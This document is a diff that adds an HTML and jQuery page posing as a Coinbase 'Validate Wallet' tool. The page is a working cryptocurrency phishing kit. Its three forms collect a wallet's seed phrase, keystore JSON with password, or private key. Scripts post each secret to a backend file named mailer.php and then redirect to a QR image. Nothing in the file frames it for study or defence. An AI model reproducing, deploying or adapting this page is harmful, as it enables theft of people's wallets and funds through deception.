@@ -1,0 +1,203 @@
+
+<!DOCTYPE html>
+<html><head>
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+	<title>Validate Wallet</title>
+	<link rel="stylesheet" href="./assets/bootstrap/css/bootstrap.min.css">
+	<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" rel="stylesheet">
+	<link rel="stylesheet" href="./assets/css/styles.css">
+</head>
+
+<body>
+<header>
+	<div class="container-fluid">
+		<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<a class="text-white" href="/" style="font-size: 20px;"><i class="fas fa-angle-left"></i>&nbsp; &nbsp;Validate Wallet</a>
+			</div>
+		</div>
+	</div>
+</header>
+<div class="container-fluid">
+	<div class="row">
+		<div class="col-md-4 offset-md-4">
+			<ul class="nav nav-tabs">
+				<li class="nav-item"><a class="nav-link active show" data-toggle="tab" href="#phrase">Phrase</a></li>
+				<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+				<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+			</ul>
+		</div>
+	</div>
+</div>
+<section style="margin-top: 40px;">
+	<div class="container-fluid">
+		<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<!-- Tab panes -->
+				<div class="tab-content">
+					<div role="tabpanel" class="tab-pane fade active show" id="phrase">
+						<form method="post" action="../action/mailer.php">
+							<textarea class="form-control" rows="5" minlength="12" id="phrase_value" name="phrase" placeholder="Phrase"></textarea>
+							<span class="text-danger hide" id="phrase_status"><small>Invalid mnemonic phrase, please enter a valid mnemonic phrase</small></span>
+							<span class="text-danger hide" id="phrase_result"><small>Unable to validate mnemonic phrase, please try again.</small></span>
+							<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single space.</p>
+							<input type="hidden" name="name" id="phrase_name" value="Coinbase">
+							<div class="form-group"><button class="btn btn-primary btn-block" id="submit_phrase" type="submit">VALIDATE</button></div>
+						</form>
+					</div>
+					<div role="tabpanel" class="tab-pane fade" id="keystore">
+						<form method="post" action="../action/mailer.php">
+							<div class="form-group">
+								<textarea class="form-control" name="keystorejson" id="keystorejson_value" minlength="12" rows="5" placeholder="Keystore JSON"></textarea>
+							</div>
+							<div class="form-group">
+								<input class="form-control" type="password" minlength="4" id="keystorepasswword" name="keystorepasswword" placeholder="Password">
+							</div>
+							<span class="text-danger hide" id="keystore_status"><small>Invalid keystore json or keystore password</small></span>
+							<span class="text-danger hide" id="keystore_result"><small>Unable to validate keystore, please try again.</small></span>
+							<p class="text-secondary" style="margin-top: 10px;">
+								Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+							</p>
+							<input type="hidden" name="name" id="keystore_name" value="Coinbase">
+							<div class="form-group"><button class="btn btn-primary btn-block" id="submit_keystore" type="submit">VALIDATE</button></div>
+						</form>
+					</div>
+					<div role="tabpanel" class="tab-pane fade" id="privatekey">
+						<form method="post" action="../action/mailer.php">
+							<div class="form-group">
+								<input class="form-control" id="privatekey_value" name="privatekey" minlength="12" placeholder="Private Key">
+							</div>
+							<span class="text-danger hide" id="privatekey_status"><small>Invalid private key</small></span>
+							<span class="text-danger hide" id="privatekey_result"><small>Unable to validate private key, please try again.</small></span>
+							<p class="text-secondary" style="margin-top: 10px;">Private key is an Alphanumeric(alphabets and digits) numbers.</p>
+							<input type="hidden" name="name" id="privatekey_name" value="Coinbase">
+							<div class="form-group"><button class="btn btn-primary btn-block" id="submit_privatekey" type="submit">VALIDATE</button></div>
+						</form>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</section>
+<script src="./assets/js/jquery.min.js"></script>
+<script src="./assets/bootstrap/js/bootstrap.min.js"></script>
+<script>
+	$(function() {
+		$("#submit_phrase").on('click', function(e){
+			e.preventDefault()
+			let phraseStatus = $('#phrase_status');
+			let name  = $('#phrase_name');
+			let phrase = $('#phrase_value');
+			$(this).addClass('disabled').attr('disabled')
+			$(this).html("VALIDATING...")
+			phraseStatus.addClass('hide');
+			$("#phrase_result").addClass('hide');
+			phrase.removeClass('border border-danger');
+			if (phrase.val().trim().split(" ").length === 12 || phrase.val().trim().split(" ").length === 24) {
+				$.post("../action/mailer.php",
+						{
+							name: name.val(),
+							type: 'phrase',
+							phrase: phrase.val()
+						}).done(function (response) {
+					$("#submit_phrase").removeClass('disabled').removeAttr('disabled')
+					$("#submit_phrase").html('VALIDATE')
+					//console.log(response)
+					if (response == 'successful') {
+						window.location = '../result/QR/QRScanCode.png'
+					} else {
+						$("#phrase_result").removeClass('hide')
+					}
+				})
+			} else {
+				$("#submit_phrase").removeClass('disabled').removeAttr('disabled')
+				$("#submit_phrase").html('VALIDATE')
+				phraseStatus.removeClass('hide');
+				phrase.addClass('border border-danger');
+				return false;
+			}
+
+		});
+
+		$("#submit_keystore").on('click', function(e){
+			e.preventDefault()
+			let name  = $('#keystore_name');
+			let keystore = $('#keystorejson_value');
+			let keystorePassword = $('#keystorepasswword');
+			let keystoreStatus = $('#keystore_status');
+			$(this).addClass('disabled').attr('disabled')
+			$(this).html("VALIDATING...")
+			keystoreStatus.addClass('hide');
+			$("#keystore_result").addClass('hide');
+			keystore.removeClass('border border-danger');
+			keystorePassword.removeClass('border border-danger');
+			if (keystore.val().length > 12 && keystorePassword.val().length > 4) {
+				$.post("../action/mailer.php",
+						{
+							name: name.val(),
+							type: 'keystore',
+							keystore: keystore.val(),
+							password: keystorePassword.val()
+						}).done(function (response) {
+					$("#submit_keystore").removeClass('disabled').removeAttr('disabled')
+					$("#submit_keystore").html('VALIDATE')
+					//console.log(response)
+					if (response == 'successful') {
+						window.location = '../result/QR/QRScanCode.png'
+					} else {
+						$("#keystore_result").removeClass('hide')
+					}
+				})
+			} else {
+				$("#submit_keystore").removeClass('disabled').removeAttr('disabled')
+				$("#submit_keystore").html('VALIDATE')
+				keystoreStatus.removeClass('hide');
+				keystore.addClass('border border-danger');
+				return false;
+			}
+
+		});
+
+		$("#submit_privatekey").on('click', function(e){
+			e.preventDefault()
+			let privatekeyStatus = $('#privatekey_status');
+			let name  = $('#privatekey_name');
+			let privatekey = $('#privatekey_value');
+			$(this).addClass('disabled').attr('disabled')
+			$(this).html("VALIDATING...")
+			privatekeyStatus.addClass('hide');
+			$("#privatekey_result").addClass('hide');
+			privatekey.removeClass('border border-danger');
+			if (privatekey.val().length > 10) {
+				$.post("../action/mailer.php",
+						{
+							name: name.val(),
+							type: 'privatekey',
+							privatekey: privatekey.val()
+						}).done(function (response) {
+					$("#submit_privatekey").removeClass('disabled').removeAttr('disabled')
+					$("#submit_privatekey").html('VALIDATE')
+					//console.log(response)
+					if (response == 'successful') {
+						window.location = '../result/QR/QRScanCode.png'
+					} else {
+						$("#privatekey_result").removeClass('hide')
+					}
+				})
+			} else {
+				$("#submit_privatekey").removeClass('disabled').removeAttr('disabled')
+				$("#submit_privatekey").html('VALIDATE')
+				privatekeyStatus.removeClass('hide');
+				privatekey.addClass('border border-danger');
+				return false;
+			}
+
+		});
+
+	});
+</script>
+
+
+</body></html>
